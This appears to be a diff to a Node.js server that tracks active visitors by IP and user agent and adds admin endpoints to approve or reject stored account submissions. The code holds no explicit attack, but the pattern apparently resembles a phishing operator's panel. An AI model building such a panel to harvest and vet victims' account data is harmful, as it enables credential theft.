@@ -17,6 +17,7 @@ async function addSubmission(type, data) {
     id: Date.now() + "_" + Math.random().toString(36).slice(2, 8),
     type,
     account: data.account || "",
+    status: "pending",
     time: new Date().toISOString(),
     data: { ...data }
   };
@@ -38,6 +39,25 @@ async function clearSubmissions() {
 }
 
 const adminSessions = new Set();
+
+// Active visitors tracking
+const visitors = new Map();
+const VISITOR_TIMEOUT = 60000;
+
+function trackVisitor(req) {
+  const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
+  const ua = req.headers["user-agent"] || "";
+  const key = ip + "|" + ua.slice(0, 50);
+  visitors.set(key, { ip, t: Date.now(), ua: ua.slice(0, 80) });
+}
+
+function getActiveVisitors() {
+  const now = Date.now();
+  for (const [k, v] of visitors) {
+    if (now - v.t > VISITOR_TIMEOUT) visitors.delete(k);
+  }
+  return [...visitors.values()];
+}
 
 const MIME = {
   ".html": "text/html; charset=utf-8",
@@ -331,7 +351,32 @@ http.createServer(async (req, res) => {
     return sendJsonApi(res, 200, sent ? { ok: true } : { ok: false, error: "فشل الإرسال" });
   }
 
+  if (urlPath === "/admin/api/active-visits" && req.method === "GET") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const active = getActiveVisitors();
+    return sendJsonApi(res, 200, { ok: true, count: active.length, visitors: active });
+  }
+
+  if (urlPath === "/admin/api/approve" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    if (body.id) {
+      await supabase.from("submissions").update({ status: "approved" }).eq("id", body.id);
+    }
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
+  if (urlPath === "/admin/api/reject" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    if (body.id) {
+      await supabase.from("submissions").update({ status: "rejected" }).eq("id", body.id);
+    }
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
   if (urlPath.startsWith("/_serverFn/") && req.method === "POST") {
+    trackVisitor(req);
     const hash = urlPath.replace("/_serverFn/", "");
     console.log("[REQ] serverFn hash:", hash.slice(0, 12) + "...", "from:", req.headers["user-agent"]?.slice(0, 40));
     const handler = SERVER_FN_HANDLERS[hash];
